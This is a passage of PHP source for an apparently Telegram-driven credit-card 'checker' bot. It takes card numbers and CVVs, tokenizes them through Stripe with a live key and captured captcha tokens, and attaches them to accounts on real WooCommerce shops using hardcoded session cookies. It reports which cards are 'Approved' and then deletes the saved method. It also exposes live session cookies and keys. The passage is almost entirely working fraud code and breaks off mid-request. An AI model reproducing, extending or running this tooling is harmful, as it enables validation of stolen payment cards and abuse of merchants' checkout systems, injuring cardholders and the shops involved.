$response = curl_exec($curl);
$err = curl_error($curl);
// Extraer nonce
$patron_nonce = '/"createAndConfirmSetupIntentNonce":"([^"]*)"/';
preg_match($patron_nonce, $response, $matches_nonce);
$nonce = $matches_nonce[1];
curl_close($curl);


$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://api.stripe.com/v1/payment_methods',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => 'type=card&card%5Bnumber%5D='.$cc.'&card%5Bcvc%5D='.$cvv.'&card%5Bexp_year%5D='.$ano.'&card%5Bexp_month%5D='.$mes.'&allow_redisplay=unspecified&billing_details%5Baddress%5D%5Bpostal_code%5D=10080&billing_details%5Baddress%5D%5Bcountry%5D=US&payment_user_agent=stripe.js%2Fa3221739cb%3B+stripe-js-v3%2Fa3221739cb%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Ftayhope.com&time_on_page=32394&client_attribution_metadata%5Bclient_session_id%5D=8c405d81-87ee-4878-903c-8197346734a2&client_attribution_metadata%5Bmerchant_integration_source%5D=elements&client_attribution_metadata%5Bmerchant_integration_subtype%5D=payment-element&client_attribution_metadata%5Bmerchant_integration_version%5D=2021&client_attribution_metadata%5Bpayment_intent_creation_flow%5D=deferred&client_attribution_metadata%5Bpayment_method_selection_flow%5D=merchant_specified&guid=79b6db38-13c2-4b80-9428-9d00a6cea8d23a2bca&muid=f87acd8c-3c42-492d-a089-d786e071117723820f&sid=11efb66d-58d1-4ed6-8c61-1ab112b42f2d0fc954&key=pk_live_51PRDRyRu0O8mp73n3o0HQHdi68URnbYQVlBpDv1iGSlngWgApN1jmzay2cuYC5gZlO0MFZKg3UyaLKPS54vnWSjF001pzrXQWc&radar_options%5Bhcaptcha_token%5D=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiZXJMdVJoeHJHcFVnTVF5NEVsVzdwWG1CVFpQOGJVazNrY2g0OUNVcFNydUxjZ29sZTFLNEZyVER1b1ZKRXpPRThpQkxkb3plT3ZIWWNRbTR6SE81NllqVnJVd1hieHkyckUzWmtGQmpKcHIyMXg1T2xjM3R0NDRtd29TOFBVY2h1NTkvQ1JXeC94ZmFyVHFtUDc0QTZic1RXdDhUWVpma3JFa2xQN2xBVEp1ZDM4eGhmOGFYcUZEU3VYOS9NdGc0T2VVdW5xSE1RNWRRM0w0ZlJFMWlEd3prQ3ZnQnRoTFM5WjhrMGhHelM1R3lzQ0Y5UllBRXVYK0k5dk91eGE4ZGMvSEExZ0Njd0Z2Q015czltaUVYeGdRaTY0Z0xTcE5WNjAxVUZpS05kUmJMU1V6RFl1dkowSzhxUDdsZ3FGdHZIdU9uUGZ5S0Vkd1FKQXlyYlBBL3VjQyswZWd6S1FKOXBiYlorNlhhUk9ibllaSzRLSnBHVGFRd3JTTW90cDZrLytlQXpvbWkyVEwyT0JKNHliWnQxdVFpU3c0akNlMk5wcU5jTVN1RWlES1dzd2hkYnVkTXZNc2ZIRVQ5T1dlMG5DdndnN1AwMXFVSmt1WWE5ZXhmd3hZSXdKZUpteVhBbnJ5bUM2RkhEaWp5Tml0OE41N3FoclpBQ1NNQXZ3QzcwOFk5d1hobHBKV1BTUXZvRUNpZ3llWUNCQ2dNOE0zTElJSit0SzNwUiszWWRaVlV4Z1NSVWxRajJnVlYwYlJGSVN0RlRjZHFzU0xhWXd3N1hzVzJYRk9DKzJSMHJCMnZidUloZXBBRm9JWVZLWHdnb0FDK0U4ZUZLV1Jld2ZoMExNcG45OWhETDZDcVIyREdwZWVvTzYwQzJiZ2dKbFJhbnRxUEg2WFhGZUR3YWRaTWRaS3ZIcmo4MUgrQ2llanMyWWxqYThXNXYxY3c0QTdWRXRSRlBrZ29KSzVQenEyOWo0Q2RaMEtheWVTV0FpV3VEMUd6WG1haEU0NjI2WVN2ZjcrYWdKSDZldDRVV2ZOYUI5SkQwcVRSVlhMSzYyT212QitLYlpyOERoVFA1R0c3TUt1TmxTN0tIdG9OUXVTekxzdldrRUJWQnEydTlqMTZyeEpIN2JWSXlwM1hFczNxbHRQd09mUjg3YVBDNERJNWx6QzdldDNQVEQ4a0VkSDdoejlxQmxDYlY3L09CVXpaa3ZKOEJ4OVJPWDlDWUNsQklFczZHbndFM3JSVjgvRzUvZXZUbHo4c1pQcTBTR1EvZ3dlbkZqL2xySU9TZmNoSUJZMzRvWUhVM0Jnc3BMVy95K1JXVzZLbnBrYmdXaVRrNmdnRVZrZ1NmWDcreTNKZE9nYm1sbWRtTkhGRW9ock41b284cFhzd2QyQWdaWFB6UDVzSmNLWS81bnJ3dklNVklRYjlVR2E0eUszMVl4WXgyUndQTVRvVjlUd3hQbDdzY0wrTVJTeXhMd0NINHlLU1hGZVVkQzB3OTJ2RFZzK2tJaUVRYTVqZjd3bnppWUVDcTU0U0I4ekVGS01DN0U4LzhqOFF2Vi8yTjN5R0FDNHV4dWVoMjNZajRZN28xd1Y3WmxEcDh0dDV3Nk9xLzdBQjVkcTREZmdUY2xZMmJuRGJHb0h3V2tMeGJWTG9hSFdxWm9aUFlJWmFEL0FUWHJ2MGVtSkdsa0h1OHk5YzRuWFI5cVlPWXJlZXEvd2NIbFlhRTJnaXIxT3V1OEF6TWVwZjNoZ1NObXZrVjZic1BhNHlNUHpIREdPMEI3VjVzbm41UU5RdFoyeDM5ZnY2VitIOXFpY2VDVnI1SEE0aEFpa05abjBlQWNUcFNmdDJmZWNSL2ZEZGtQWG0vYTZRVHJmRDVZOTExdEV2Z045cmhIYjZrQ0dBY0QyaFRUbVhONlBnMlJvYkFsSmZ0SWY1ZTlWeXhkc2NKd2l5cG5RT0t2RW9hcDRrcXg2L1lIKy9HVDlIL01PWXY3S3JrM3lWTnhLSGw3V2ZXOTJVVVpvTGxZaUVBczJHd2h4bVdxQzRXbEY2bjNHRFgxa0IyQXdCMlQzOWtiTG5TNnpPQjBFWnR1Zm01eVdwY0dJcjdXUXdKRk5TcU9qS24xbTZRM3c0OWdkaVRsK1BIN0RPMmFiRVdhejZGOGdjck1kT3RvajJGZStMbE1uZkJJcDY3dHlJZ2hHdHRrVjNjVHFMWm50Wk9yZkVYYkRwMW8yVHFsZkJXRkRXLzZiMGZ4MEM1YWJMNUVOa0hISk5wY1RaZHgyd3RFeTVRaHR6NURORDZtYTNSYmVudDIyL1hxLzBYWUZJTmhIZ2JzclVpUnRDR3hoM1QxVTcrd0g2K3l0V1o5N2J6YlpOMzlDVmZOU25Xem1XcVAvR2tYeWdtYWQvRzlvNzdXd2w3QkNUeFR3ZzJjM1JobmJUMkl3OGFGRlBaUng5dEkvdldGN2xac3FlNkpBMVRyQm9iM054TDhtaVVoYkhOazVxZkZHN1JYSWxzM2tWMkZTQlBCMTZjaFNKNVZhdVBFREFydER2RUI2d08xY1oxTzlUYVE1bG1nTmFZZzBXZ3FDZ3lsTzN5MTA4bVFleEFLYVU0QS9jMWpnYTZBUkhqb0ZQWXVBcFIySEhRYW92ZEZzMWpUVUZrc21ZTTYwYUlqeUZrb3IwbW82NElqM0tveHR0SEczYmgzWW80SWQrTkhtR3hZOUd3Z0dEMjdwald5dk5wZndaRkNaMzJDUTkzQkhvTlo5SEZCK0ZRMUpaWVpBb29BZ0xBaXd0ZEZiZUgvUXJKcGNYbURxV1h3PT0iLCJleHAiOjE3MzE3OTkzMDQsInNoYXJkX2lkIjoyMjE5OTYwNzMsImtyIjoiMWZmMDllMmQiLCJwZCI6MCwiY2RhdGEiOiJIbWxnbHpWaTRiUjUxaUhhSjM1Z0ZtRUNuN1ZXSTVIRXYrUVovY1NCMXZKNVZmVWNQSHFzYUJuNmZGYUVRTXdqU3h0OFJjVUttWjF1aUl0TTZyNTV4RVdaWjdycGFBMEZIck9QL1FuenF1bXplQjUzNTYvTytnN2ZvWmZrN1FKbGwzOTdvbmt6SGVQQnJzdlJFN1BBbWcxamp2YWpDdnpZbDVmUDUyWHQ5RnN4Sk1HY3N4RzgrMUVWaUVYaExpVEVHOVVmYmZyU3dhcUkyWlArIn0.Fja1qIx2qx8Y4OqICzg1kr4YgH6kX0UYl1XYACNkOIE',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
    'Accept: application/json',
    'Content-Type: application/x-www-form-urlencoded',
    'sec-ch-ua-platform: "Android"',
    'origin: https://js.stripe.com',
    'referer: https://js.stripe.com/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
$json = json_decode($response, true);
$id = $json["id"];
curl_close($curl);



$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://tayhope.com?wc-ajax=wc_stripe_create_and_confirm_setup_intent',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => 'action=create_and_confirm_setup_intent&wc-stripe-payment-method='.$id.'&wc-stripe-payment-type=card&_ajax_nonce='.$nonce.'',
  CURLOPT_COOKIE => '__stripe_mid=f87acd8c-3c42-492d-a089-d786e071117723820f; wordpress_logged_in_c070ca56ecb509fdfa7f9f75c40ac645=reech1951%7C1732924778%7C69TKrBK1V9SgCsX2ZOLdaRX6UOxgRfN40Uu1MjesFic%7C0bb916415e9e6e6e5ee677ab1839392de7209173e898fec8aec33a853e8efcf4; wp_woocommerce_session_c070ca56ecb509fdfa7f9f75c40ac645=200%7C%7C1731887937%7C%7C1731884337%7C%7C8d1d339670b9baedf6f1ed5a0529c4cb; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-16%2023%3A15%3A18%7C%7C%7Cep%3Dhttps%3A%2F%2Ftayhope.com%2Fmy-account%2Fadd-payment-method%2F%3Fvisit_international_btn%3Dtrue%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-11-16%2023%3A15%3A18%7C%7C%7Cep%3Dhttps%3A%2F%2Ftayhope.com%2Fmy-account%2Fadd-payment-method%2F%3Fvisit_international_btn%3Dtrue%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Mobile%20Safari%2F537.36; dontshow=true; __stripe_sid=11efb66d-58d1-4ed6-8c61-1ab112b42f2d0fc954; sbjs_session=pgs%3D4%7C%7C%7Ccpg%3Dhttps%3A%2F%2Ftayhope.com%2Fmy-account%2Fadd-payment-method%2F',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua-platform: "Android"',
    'x-requested-with: XMLHttpRequest',
    'content-type: application/x-www-form-urlencoded; charset=UTF-8',
    'origin: https://tayhope.com',
    'referer: https://tayhope.com/my-account/add-payment-method/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
$json = json_decode($response, true);
//------------------------------------------//
//$message = $json['data']['error']['message'];
$message = str_replace("Error: ", "", $json['data']['error']['message']);
$success = $json['success'];
$status = $json['data']['status'];
curl_close($curl);

if ($success === true && $status === "succeeded") {
    $respo = "𝑨𝒑𝒑𝒓𝒐𝒗𝒆𝒅!";


$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://tayhope.com/my-account/payment-methods/',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
  CURLOPT_COOKIE => '__stripe_mid=f87acd8c-3c42-492d-a089-d786e071117723820f; wordpress_logged_in_c070ca56ecb509fdfa7f9f75c40ac645=reech1951%7C1732924778%7C69TKrBK1V9SgCsX2ZOLdaRX6UOxgRfN40Uu1MjesFic%7C0bb916415e9e6e6e5ee677ab1839392de7209173e898fec8aec33a853e8efcf4; wp_woocommerce_session_c070ca56ecb509fdfa7f9f75c40ac645=200%7C%7C1731887937%7C%7C1731884337%7C%7C8d1d339670b9baedf6f1ed5a0529c4cb; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-16%2023%3A15%3A18%7C%7C%7Cep%3Dhttps%3A%2F%2Ftayhope.com%2Fmy-account%2Fadd-payment-method%2F%3Fvisit_international_btn%3Dtrue%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-11-16%2023%3A15%3A18%7C%7C%7Cep%3Dhttps%3A%2F%2Ftayhope.com%2Fmy-account%2Fadd-payment-method%2F%3Fvisit_international_btn%3Dtrue%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Mobile%20Safari%2F537.36; dontshow=true; __stripe_sid=11efb66d-58d1-4ed6-8c61-1ab112b42f2d0fc954; sbjs_session=pgs%3D4%7C%7C%7Ccpg%3Dhttps%3A%2F%2Ftayhope.com%2Fmy-account%2Fadd-payment-method%2F',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua-platform: "Android"',
    'referer: https://tayhope.com/my-account/add-payment-method/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
curl_close($curl);

$response = curl_exec($curl);
$err = curl_error($curl);
$patron = '/\/\d+\/\?_wpnonce=[a-f0-9]+/';
preg_match($patron, $response, $coincidencias);
$url_nonce = $coincidencias[0];
curl_close($curl);

echo "$url_nonce\n";




$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://tayhope.com/my-account/delete-payment-method'.$url_nonce.'',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
  CURLOPT_COOKIE => '__stripe_mid=f87acd8c-3c42-492d-a089-d786e071117723820f; wordpress_logged_in_c070ca56ecb509fdfa7f9f75c40ac645=reech1951%7C1732924778%7C69TKrBK1V9SgCsX2ZOLdaRX6UOxgRfN40Uu1MjesFic%7C0bb916415e9e6e6e5ee677ab1839392de7209173e898fec8aec33a853e8efcf4; wp_woocommerce_session_c070ca56ecb509fdfa7f9f75c40ac645=200%7C%7C1731887937%7C%7C1731884337%7C%7C8d1d339670b9baedf6f1ed5a0529c4cb; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-16%2023%3A15%3A18%7C%7C%7Cep%3Dhttps%3A%2F%2Ftayhope.com%2Fmy-account%2Fadd-payment-method%2F%3Fvisit_international_btn%3Dtrue%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-11-16%2023%3A15%3A18%7C%7C%7Cep%3Dhttps%3A%2F%2Ftayhope.com%2Fmy-account%2Fadd-payment-method%2F%3Fvisit_international_btn%3Dtrue%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F131.0.0.0%20Mobile%20Safari%2F537.36; dontshow=true; __stripe_sid=11efb66d-58d1-4ed6-8c61-1ab112b42f2d0fc954; woocommerce_items_in_cart=1; sbjs_session=pgs%3D5%7C%7C%7Ccpg%3Dhttps%3A%2F%2Ftayhope.com%2Fmy-account%2Fpayment-methods%2F',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua-platform: "Android"',
    'referer: https://tayhope.com/my-account/payment-methods/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
curl_close($curl);


} elseif ($success === true && $status === "requires_action") {
    $respo = "3DS Authenticate Rejected ❌";
} else {
    $respo = $message;
}


$timetakeen = (microtime(true) - $startTime);
$time = substr_replace($timetakeen, '', 4);
$proxy = "LIVE ✅";

$bin = "<code>".$bin."</code>";
$lista = "<code>".$lista."</code>";


if (empty($respo)) {
        $respo = $response;
}


if (array_in_string($respo, $live_array)) {
    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Stripe 3D\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: Approved! ✅\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
    $live = True;
} elseif (strpos($respo, 'This transaction cannot be processed.') !== false || strpos($respo, 'Your card was declined.') !== false) {
    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Stripe 3D\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: Declined ❌\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
    $live = False;
} else {
    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Stripe 3D\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: Gate Error❌\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
    $live = False;
}

if ($live) {
    editMessage($chatId, $respuesta, $id_text);
} else {
    editMessage($chatId, $respuesta, $id_text);
}

//--------FIN DEL CHECKER MERCHAND - CHARGED--------/
ob_flush();

}
	
if (preg_match('/^(!|\/|\.)tr/', $message)) {
$tr = explode(" ", $message);
$tr = ltrim($tr[0], "/.!"); // elimina /, . o ! del inicio del primer elemento del arreglo
if ($tr == "trad") {
    die();
}
	
$lista = substr($message, 4);
$i = preg_split('/[|:| ]/', $lista);
$cc    = trim($i[0]);
$mes   = trim($i[1]);
$ano  = trim(substr($i[2], -2));
$cvv   = trim($i[3]);

$bin = substr($lista, 0, 6);
$num = "$cc$mes$ano1$cvv";
//-----------------------------------------------------//

//Verifi//
if (!is_numeric($cc) || strlen($cc) != 16 || !is_numeric($mes) || !is_numeric($ano) || !is_numeric($cvv)) {
    $respuesta = "🚫 Oops!\nUse this format: /tr CC|MM|YYYY|CVV\n";
    sendMessage($chatId, $respuesta, $message_id);
    die();
}



//----------------MENSAGE DE ESPERA-------------------//
$respuesta = "<b>🕒 Wait for Result...</b>";
sendMessage($chatId,$respuesta, $message_id);
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
        //----------------------------------------------------//

$longitud = 4;
$partes = [];
for ($i = 0; $i < strlen($cc); $i += $longitud) {
    $parte = substr($cc, $i, $longitud);
    $partes[] = $parte;
}

$cc = implode('+', $partes);

$startTime = microtime(true); //TIEMPO DE INICIO
$BinData = BinData($bin); //Extrae los datos del bin

///EXTRAE EL NONCE//
$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://www.thetravelinstitute.com/my-account/add-payment-method/',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,                                                                CURLOPT_TIMEOUT => 30,                                                                  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,                                          CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => 'payment_method=stripe&wc-stripe-payment-method-upe=&wc_stripe_selected_upe_payment_type=&wc-stripe-is-deferred-intent=1&wc-stripe-new-payment-method=true&i13_recaptcha_payment_method_token=03AFcWeA6foAp_rGd2sG9ZMJLBe-M4eaFwhSZbI0_m48A3FwGDjldZvu7c9cYidlfJIfJRuz_f2cqn-3U8Lp9YAcTmv8s8wQPvzHojpHeIDwAg0OoB04f-pqYcDYrlhs22DIak-XTN7amGQTwXRsooPHW8rAK7hp0FbQI69PQJyIZ-EOx4xT7A52t5e5FjfEjFegwAbKZ9pL3LqMGPOkzo25TkH7l1FFm_X5uFrIRIBbyLuKS3rRox0Tr983Leigv1j5_K5MYM0B7ot2mthbC7G5kT2qqxlnW01bbeNy81h-eMrHYLqv_kZv1-EsccxNf7nsZg2EWlPqAYuLyVdX9G7ODKgeV2-xF3agKKRB5CMWqC03D8xQsOb3FyDf1UCtppGU-taMXGnIkJd1GRHcqBQLKXz-FoUUVgiIAoQUXUP2eCvBLBitNHCFNiS0f0LGgBAFGB-2nAmZpdiCX5NTCuxA9xJ9yDeG5djLpiRGdgLTC8H5A1D0Weo6Lc9-4D4VQtlUde1icdvkFlMzQtwlktDh3jcV3kCsOoLrupcBj8rt1EXBOlQCzUSbLE9l9SdTYx7-Q3Ep3eyFlh4aFrOR-t8RqzFDlufbWI5Hyfa49Xo_GdRpnkm9I5iGYb-Le-Mqf6hkNRoM9LBd1-czOUTLgY-7j2WKOCRxNZpo1nO2qQXrxjemn9KkL1Khs1PhjgpNvVYQ5nJYoTNwkiAg_0YeWW11rSsHQi25o1U6zrN1FtLHzAWird-hpcznfTXzTKZp6lWHfs5RHcP5xEEMGu6u51YPoJnln2LbvH_uLrbYLd6ithc4a9eI2w2wUJs4mnlSl1mjuEadLerVHuo5nbxDMZIjcP96KFJx6tfL-mux-DTwBnvYhN5cbF3XfaoritS5gKef5D0OKHfdzWqRUkfJz5Fq2URv9KhsfTua4sjvKpQI2RM9r8pbDWLvE0nij4jA_m1XG327U9fsFdZI-DudmnOTI5Xb1bN1BaOr3emqIK6IVu4MzCYcwH2chj6O5Ej1LCK00FudRwcRJVm_y8CIy0B8rt67Yav3HQc9wHhEGYk-tPTz4y_rFGfA2k1QZMvWtDieDoOcRAE41waNKV6a9Nji-A3Rv4ZdZWD6f_PBgexDt_tjkx2aghGHr901kpUQlr7bXbPEumSCLKeoJRy28nlgIqZx0Rv-gPSi7BtxsSO2Ls43G4tuUoXPPJSORcigzr742uC65fzk-CEaonjWEE9sdQYn7GRquKGDIexa3gGUm2UNOkkUEaCrnd2HdGk0xiWGUbGx9DxvHPb6YBWgnb-LsNohZ-Etjhh1BuHcnpr8oAC0X2FVlGca3LU-xkmgf6F38SABqxNog420Nqr8atEzgoCq4NXOlfXwAKvJKDx_NWWEss4mAMERdCEP87U7cwr7u8V-aOLLaOTHNKZTt73ly9Kjxz8AbjsuR2gvmTNziDlD5ReUKNgrXelvxxy8xfF6pz5dYxUOrR4mfSI3SfofuLboxxnWBJbfYMj-UG0bPCymLkqBRIRy_Wfw85bDibZ1G22011gEwwSRmlFWf8K92AfThrmxTXNBd4pqquEg6oFm2YlB7ycv8gmHYxf4czrpSbpDNC2h1ZZMxwa0xkhXM56yh90YLElhJ8HVyAOHVCf8eKGwWRzzAOtJrSHqhiZq6YOwlc3QXCFb97LJSxGbDfsei-I7GQGC2-FCh2cv4NJHb2ioqO-T19CNGfbSbcdUvVs-p0juJ6g4CBOkTQIxD8gM3Sv7p5afTme_xYZfQyAr6PscuFj1uLaq-0N7FNkPRrt9583bsXg1rOwLa-SudO8nOultL7HIBLfi3tqkFbdbhA_0pcKDZRuF_h3ZhT7gbPtlMtrxcN6fVtRBTBe1U5bEiCbcg0jbPH5BhdYG9R1oeRuSUsp9aHL-EMJy7dwQ8bMMY55K_i9qPm-SnFvvuxVSR8gkdRrGL-yIi4GjnZBSODuT-9Ac6ipQE5YLyexcR755QghPEW6--mvgkPrt5SZH3uhylqrVKZOK9d6w-kYpg9ZGWSmTo9c6SUdQGR1jakc9rPodr7XVUytge3zqMt2oZf5OiIhapvXD16WqJ-oYOYvifG5l_LpsLytczI_kkA_Q7qFcsNWf8hUiJ5JSlCzy5xGSm-tgXT3YeulMizWlb4RoGQVpHzBSbNKzVTxAb86vHOanikS5F_2q1twDVV4mzyknIN1GkdXlRPtsPfHS64BE8ZEIyrrEbmX2opz6grvUHTMyEVZ4BeolTdTdEIl3INkSBzdU842cXr7OKxr1B_-ESe2YQ&woocommerce-add-payment-method-nonce=a7151db41c&_wp_http_referer=%2Fmy-account%2Fadd-payment-method%2F&woocommerce_add_payment_method=1',
  CURLOPT_COOKIE => 'mailchimp_landing_site=https%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fpayment-methods%2F; __stripe_mid=2e26787c-c102-4578-aa4b-fba54c859921bb7405; mailchimp_user_email=Dausitherer%40cuvox.de; wordpress_logged_in_104df0bcc01c764423018f9bcd47f262=dausitherer%7C1737508507%7CkQ0NDWvxtUSzjUm9y4tHOdo87KOvxxrAfqXeXAcly6L%7Cb88250a3e9f28c7927434437f6a2d7da9ae501cf6b279b861491bb8baa209e03; sbjs_session=pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.thetravelinstitute.com%2Fmy-account%2Fadd-payment-method%2F; __stripe_sid=c8b725f0-d8a9-4fd4-ad28-2cea16b61ba4cd0533',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
    'Content-Type: application/x-www-form-urlencoded',
    'cache-control: max-age=0',
    'sec-ch-ua: "Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"',
    'upgrade-insecure-requests: 1',
    'origin: https://www.thetravelinstitute.com',
